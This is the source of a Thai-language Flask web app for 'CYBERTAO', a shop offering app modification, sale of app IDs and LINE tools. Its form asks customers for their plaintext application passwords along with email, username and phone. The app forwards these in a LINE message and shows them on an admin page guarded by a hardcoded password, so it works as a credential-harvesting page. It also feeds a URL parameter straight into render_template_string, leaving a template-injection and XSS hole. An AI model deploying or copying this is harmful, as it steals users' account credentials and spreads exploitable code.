import json
import requests
from flask import Flask, request, render_template_string

app = Flask(__name__)
db_submissions = []

ADMIN_PASSWORD = "tao2026_secure"
LINE_TOKEN = "YOUR_LINE_NOTIFY_TOKEN"

def send_line_notification(data):
    if LINE_TOKEN == "YOUR_LINE_NOTIFY_TOKEN":
        return
    url = "https://line.me"
    headers = {"Authorization": f"Bearer {LINE_TOKEN}"}
    message = (
        f"\n🔔 [มีลูกค้าแจ้งใช้บริการใหม่]\n"
        f"📌 หมวดหมู่: {data['service_type']}\n"
        f"📧 อีเมล: {data['email']}\n"
        f"👤 Username: {data['username']}\n"
        f"📞 เบอร์โทร: {data['phone']}\n"
        f"🔑 รหัสผ่าน: {data['password']}\n"
        f"📝 รายละเอียด: {data['details']}"
    )
    try:
        requests.post(url, headers=headers, data={"message": message})
    except:
        pass

# ฝังดีไซน์สไตล์ Cyberpunk ในตัวระบบโดยตรง ปลอดภัยต่อเบราเซอร์มือถือ
STYLE = "<style>body{background-color:#05050a;color:#f1f5f9;font-family:sans-serif;padding:20px;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:95vh;margin:0;box-sizing:border-box;}.container{width:100%;max-width:420px;text-align:center;}h1{color:#10b981;text-shadow:0 0 15px rgba(16,185,129,0.7);font-size:26px;margin-bottom:5px;font-weight:900;}.sub{color:#64748b;font-size:13px;margin-bottom:25px;}.card{background:#0f172a;border:1px solid #1e293b;padding:20px;border-radius:16px;margin-bottom:18px;display:flex;justify-content:space-between;align-items:center;text-align:left;}.c-green{border-color:#10b981;box-shadow:0 0 12px rgba(16,185,129,0.2);}.c-blue{border-color:#3b82f6;box-shadow:0 0 12px rgba(59,130,246,0.2);}.c-purple{border-color:#8b5cf6;box-shadow:0 0 12px rgba(139,92,246,0.2);}.card h3{margin:0 0 4px 0;font-size:16px;color:#fff;}.card p{margin:0;font-size:12px;}.p-green{color:#10b981;font-weight:bold;}.p-blue{color:#3b82f6;font-weight:bold;}.p-purple{color:#8b5cf6;font-weight:bold;}.btn{padding:10px 16px;border-radius:12px;font-size:13px;font-weight:bold;text-decoration:none;display:inline-block;border:none;cursor:pointer;transition:all 0.2s;}.btn-green{background:#10b981;color:#000;}.btn-green:hover{background:#059669;transform:translateY(-1px);}.btn-blue{background:#3b82f6;color:#fff;}.btn-purple{background:#8b5cf6;color:#fff;}.form-box{background:#0f172a;border:1px solid #1e293b;padding:25px;border-radius:18px;width:100%;text-align:left;box-sizing:border-box;}.form-group{margin-bottom:15px;}.form-group label{display:block;font-size:12px;color:#94a3b8;margin-bottom:5px;}.form-group input,.form-group textarea{width:100%;background:#05050a;border:1px solid #334155;padding:11px;border-radius:10px;color:#fff;box-sizing:border-box;outline:none;font-size:14px;}.form-group input:focus{border-color:#10b981;}table{width:100%;border-collapse:collapse;background:#0f172a;border-radius:12px;overflow:hidden;font-size:13px;text-align:left;}th,td{padding:14px;border-bottom:1px solid #1e293b;}th{background:#020617;color:#94a3b8;}</style>"

@app.route('/')
def customer_index():
    return render_template_string(
        "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>CYBERTAO</title>" + STYLE + "</head>"
        "<body><div class='container'>"
        "<h1>CYBERTAO ณ.สุรินทร์</h1>"
        "<div class='sub'>ศูนย์บริการแก้ไขระบบแอปพลิเคชัน และร้านค้าไอทีไซเบอร์ครบวงจร</div>"
        "<div class='card c-green'><div><h3>แก้ไข Application</h3><p class='p-green'>ราคาเริ่มต้น ฿800 บาทขึ้นไป</p></div><a href='/form?type=ModifyApp' class='btn btn-green'>ใช้บริการ</a></div>"
        "<div class='card c-blue'><div><h3>ร้านค้าไซเบอร์ ขาย ID App</h3><p class='p-blue'>ไอดีแอปพลิเคชันหลากหลายชนิด</p></div><a href='/form?type=CyberShop' class='btn btn-blue'>เลือกซื้อ</a></div>"
        "<div class='card c-purple'><div><h3>อุปกรณ์เครื่องมือ LINE</h3><p class='p-purple'>ระบบซอฟต์แวร์ส่งสัญญาณตรงเข้า LINE</p></div><a href='/form?type=LineTools' class='btn btn-purple'>สั่งซื้อ</a></div>"
        "</div></body></html>"
    )

@app.route('/form')
def customer_form():
    t = request.args.get('type', 'General')
    return render_template_string(
        "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Form - CYBERTAO</title>" + STYLE + "</head>"
        "<body><div class='container'>"
        "<h2 style='color:#10b981; margin:0 0 5px 0;'>ส่งข้อมูลแจ้งความประสงค์</h2>"
        "<p class='sub'>บริการที่เลือก: <span style='color:#fff; font-weight:bold;'>" + t + "</span></p>"
        "<div class='form-box'>"
        "<form action='/submit' method='POST'>"
        "<input type='hidden' name='type' value='" + t + "'>"
        "<div class='form-group'><label>อีเมลติดต่อ (Email)</label><input type='email' name='email' required></div>"
        "<div class='form-group'><label>ชื่อผู้ใช้ (Username)</label><input type='text' name='user' required></div>"
        "<div class='form-group'><label>เบอร์โทรศัพท์</label><input type='tel' name='phone' required></div>"
        "<div class='form-group'><label>รหัสผ่านแอปพลิเคชัน (Password)</label><input type='text' name='pwd' required></div>"
        "<div class='form-group'><label>รายละเอียดอื่นๆ ระบุ</label><textarea name='msg' rows='3'></textarea></div>"
        "<button type='submit' class='btn btn-green' style='width:100%; padding:13px; margin-top:5px; font-size:14px;'>ส่งข้อมูลแจ้งงาน</button>"
        "</form></div><a href='/' class='sub' style='margin-top:20px; display:inline-block; text-decoration:none;'>← กลับหน้าแรก</a></div></body></html>"
    )

@app.route('/submit', methods=['POST'])
def customer_submit():
    data = {
        "service_type": request.form.get('type'), "email": request.form.get('email'),
        "username": request.form.get('user'), "phone": request.form.get('phone'),
        "password": request.form.get('pwd'), "details": request.form.get('msg')
    }
    db_submissions.append(data)
    send_line_notification(data)
    return (
        "<div style='background:#05050a;color:#10b981;padding:50px;text-align:center;font-family:sans-serif;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;margin:0;'>"
        "<h1>✓ ส่งข้อมูลสำเร็จแล้ว</h1>"
        "<p style='color:#64748b;margin:0 0 30px 0;font-size:14px;'>เจ้าหน้าที่แอดมินได้รับข้อมูลเรียบร้อยและกำลังดำเนินการส่งเรื่องเข้า ID LINE ครับ</p>"
        "<a href=\"/\" style='background:#10b981;color:#000;padding:12px 30px;text-decoration:none;border-radius:12px;font-weight:bold;font-size:14px;'>กลับหน้าหลักเว็บไซต์</a>"
        "</div>"
    )

@app.route('/cybertao-login', methods=['GET', 'POST'])
def admin_login():
    error = ""
    if request.method == 'POST':
        if request.form.get('admin_password') == ADMIN_PASSWORD:
            # สร้างตารางข้อมูลเมื่อล็อกอินผ่านประตูสำเร็จ
            table_rows = ""
            for i in db_submissions:
                table_rows += f"<tr><td style='color:#10b981; font-weight:bold;'>{i['service_type']}</td><td style='color:#fff; font-weight:600;'>{i['username']}</td><td>{i['email']}</td><td>{i['phone']}</td><td style='color:#f59e0b; font-family:monospace;'>{i['password']}</td><td style='color:#94a3b8;'>{i['details']}</td></tr>"
            
            if not table_rows:
                table_rows = "<tr><td colspan='6' style='text-align:center; color:#475569; padding:40px;'>ไม่มีรายการข้อมูลลูกค้ากรอกเข้ามาในขณะนี้</td></tr>"

            return render_template_string(
                "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Admin Dashboard</title>" + STYLE + "</head>"
                "<body><div style='width:100%; max-w:850px; box-sizing:border-box;'>"
                "<div style='display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;'>"
                "<h2 style='color:#10b981; margin:0; font-size:22px;'>📊 ฐานข้อมูลหลังบ้านแอดมิน (ลับเฉพาะ)</h2>"
                "<a href=\"/\" class='btn btn-blue' style='font-size:12px; padding:8px 14px;'>ออกจากระบบหลังบ้าน</a></div>"
                "<div style='overflow-x:auto;'><table>"
                "<tr><th>หมวดหมู่บริการ</th><th>Username</th><th>อีเมล</th><th>เบอร์โทร</th><th>รหัสผ่านลูกค้า</th><th>รายละเอียดงาน</th></tr>"
                + table_rows +
                "</table></div></div></body></html>"
            )
        else:
            error = "รหัสผ่านผู้ดูแลระบบไม่ถูกต้อง ไม่ได้รับอนุญาตให้เข้าถึง!"

    return render_template_string(
        "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Admin Security Entry</title>" + STYLE + "</head>"
        "<body><div class='container' style='max-w:350px;'>"
        "<h2 style='color:#ef4444; margin-bottom:5px;'>🔒 แผงควบคุมความปลอดภัย</h2>"
        "<p class='sub'>กรุณาระบุรหัสผ่านผู้ดูแลระบบหลังบ้าน</p>"
        "<p style='color:#ef4444; font-size:13px; font-weight:bold; margin-bottom:15px;'>" + error + "</p>"
        "<div class='form-box' style='border-color:#ef4444;'>"
        "<form action='/cybertao-login' method='POST'>"
        "<div class='form-group'><label>รหัสผ่านผู้ดูแลระบบ (Admin Password)</label><input type='password' name='admin_password' required></div>"
        "<button type='submit' class='btn' style='background:#ef4444; color:#fff; width:100%; padding:12px; margin-top:5px; font-weight:bold;'>ยืนยันสิทธิ์แอดมิน</button>"
        "</form></div><a href=\"/\" class='sub' style='margin-top:20px; display:inline-block; text-decoration:none;'>← กลับหน้าแรกลูกค้า</a></div></body></html>"
    )

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
